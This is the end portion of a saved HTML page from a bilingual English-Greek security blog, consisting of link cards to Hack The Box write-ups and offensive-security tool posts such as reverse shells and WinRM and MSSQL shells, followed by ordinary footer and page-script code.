+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune (Hack The Box) write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune (Hack The Box)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/bloodhound_analyzer/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/bloodhound.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Bloodhound analyzer</h3>
+      <h3 class="title" lang="el">Λαγωνικός αναλυτής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">21 Dec 2025</time>
+      <time lang="el">21 Δεκ 2025</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/get_outlook_rules/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/flying_mail.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">How to collect Outlook rules using Powershell</h3>
+      <h3 class="title" lang="el">Πως να συλλέξετε τους κανόνες του Outlook χρησιμοποιώντας Powershell</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">20 May 2022</time>
+      <time lang="el">20 Μαϊ 2022</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+        </div>
+      </section>
+      
+    </div>
+   </div> 
+  </div>
+
+
+<footer class="l-footer">
+<span class="copyleft">©</span>
+<span lang="en">&nbsp; Antonios Tsolis &nbsp; </span>
+<span lang="el">&nbsp; Αντώνιος Τσώλης &nbsp; </span>
+<script>
+  function email(starting,server,firstname,lastname,subject,body,closing) {
+    document.write(starting); document.write(lastname); document.write("." + firstname); document.write("@" + server);if (Boolean(subject)) { document.write("?subject=" + subject + "&body=" + body); }
+    document.write(closing); }
+  email("<a class='mymail' aria-label='Send me an email' href='mailto:", "gmail.com", "antonios", "tsolis", "", "","' target='_blank'><i class='fa fa-envelope-o' aria-hidden='true'></i></a>");
+</script><a class="mymail" aria-label="Send me an email" href="mailto:tsolis.antonios@gmail.com" target="_blank"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>
+</footer>
+<script async="" src="./Enterprise (Hack The Box) write-up - The Portal of Knowledge_files/jq-btsp-lunr.min.js" onload="init()"></script>
+<script>
+short_months = {
+  "en": ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
+  "el": ["Ιαν", "Φεβ", "Μαρ", "Απρ", "Μαϊ", "Ιουν", "Ιουλ", "Αυγ", "Σεπ", "Οκτ", "Νοε", "Δεκ"]
+}
+function init () {
+$(document).ready(function(){
+  $("#lang-selector>ul>li>a").click(function(){
+    var langid = this.id;
+    var selText = this.text;
+    document.getElementById('mainbody').setAttribute('class', langid);
+    document.getElementById('mainbody').setAttribute('lang', langid);
+    localStorage.setItem('language', langid);
+    $("#lang-selector>a").html(selText+' <i class="fa fa-caret-down" aria-hidden="true"></i>');
+  });
+
+  $("#TableOfContents a, #content-selector a").on('click', function(e) {
+    var hash = this.hash;
+    if (hash) {
+      e.preventDefault();
+      $('html, body').animate({scrollTop: $(hash).offset().top}, 1300, function(){
+        window.location.hash = hash;
+      });
+    }  
+  });
+
+  
+});}
+</script>
+<script>
+(function(a){var b=function(b,h,n){function d(a){if(f.body)return a();setTimeout(function(){d(a)})}function k(){c.addEventListener&&c.removeEventListener("load",k);c.media=n||"all"}var f=a.document,c=f.createElement("link"),g;if(h)g=h;else{var e=(f.body||f.getElementsByTagName("head")[0]).childNodes;g=e[e.length-1]}var m=f.styleSheets;c.rel="stylesheet";c.href=b;c.media="only x";d(function(){g.parentNode.insertBefore(c,h?g:g.nextSibling)});var l=function(a){for(var b=c.href,d=m.length;d--;)if(m[d].href===
+b)return a();setTimeout(function(){l(a)})};c.addEventListener&&c.addEventListener("load",k);c.onloadcssdefined=l;l(k);return c};"undefined"!==typeof exports?exports.loadCSS=b:a.loadCSS=b})("undefined"!==typeof global?global:this);
+(function(a){if(a.loadCSS){var b=loadCSS.relpreload={};b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(h){return!1}};b.poly=function(){for(var b=a.document.getElementsByTagName("link"),e=0;e<b.length;e++){var d=b[e];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d),d.rel=null)}};if(!b.support()){b.poly();var e=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){a.clearInterval(e)});a.attachEvent&&
+a.attachEvent("onload",function(){a.clearInterval(e)})}}})(this);
+</script>
+<script>
+function labnolIframe(div) {
+  var iframe = document.createElement('iframe');
+  iframe.setAttribute('src', 'https://www.youtube.com/embed/' + div.dataset.id + '?autoplay=1');
+  iframe.setAttribute('frameborder', '0');
+  iframe.setAttribute('allowfullscreen', '1');
+  iframe.setAttribute('allow', 'accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture');
+  div.parentNode.replaceChild(iframe, div);
+}
+
+function initYouTubeVideos() {
+  var playerElements = document.querySelectorAll('.youtube-player');
+  for (var n = 0; n < playerElements.length; n++) {
+    var videoId = playerElements[n].dataset.id;
+    var div = document.createElement('div');
+    div.setAttribute('data-id', videoId);
+    var thumbNode = document.createElement('img');
+    thumbNode.src = '//i.ytimg.com/vi/ID/hqdefault.jpg'.replace('ID', videoId);
+    div.appendChild(thumbNode);
+    var playButton = document.createElement('div');
+    playButton.setAttribute('class', 'play');
+    div.appendChild(playButton);
+    div.onclick = function () {
+      labnolIframe(this);
+    };
+    playerElements[n].appendChild(div);
+  }
+}
+
+document.addEventListener('DOMContentLoaded', initYouTubeVideos);
+</script>
+
+
+
+</body></html>
